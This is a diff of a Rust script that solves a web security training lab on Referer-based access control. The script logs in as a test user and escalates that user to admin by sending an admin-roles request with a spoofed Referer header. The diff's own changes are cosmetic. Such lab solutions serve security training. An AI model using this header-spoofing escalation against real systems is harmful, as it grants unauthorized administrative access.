@@ -4,7 +4,7 @@
 *
 * Date: 5/9/2023
 *
-* Lab: Referer-based access control 
+* Lab: Referer-based access control
 *
 * Steps: 1. Login as wiener
 *        2. Upgrade wiener to be an admin by adding Referer header
@@ -33,12 +33,14 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a8000f4035062ed83c7109600dd003d.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // login as wiener
     print!("{} ", "1. Logging in as wiener..".white());
     io::stdout().flush();
+
+    // login as wiener
     let login = client
         .post(format!("{url}/login"))
         .form(&HashMap::from([
@@ -47,16 +49,19 @@ fn main() {
         ]))
         .send()
         .expect(&format!("{}", "[!] Failed to login as wiener".red()));
-    println!("{}", "OK".green());
+
+    // extract session cookie
     let session = extract_session_cookie(login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // Upgrade wiener to be an admin by adding Referer header
+    println!("{}", "OK".green());
     print!(
         "{} ",
         "2. Upgrading wiener to be an admin by adding Referer header..".white()
     );
     io::stdout().flush();
+
+    // upgrade wiener to be an admin by adding Referer header
     let upgrade_wiener = client
         .get(format!("{url}/admin-roles?username=wiener&action=upgrade"))
         .header("Cookie", format!("session={session}"))
@@ -66,8 +71,8 @@ fn main() {
             "{}",
             "[!] Failed to upgrade wiener to be an admin".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
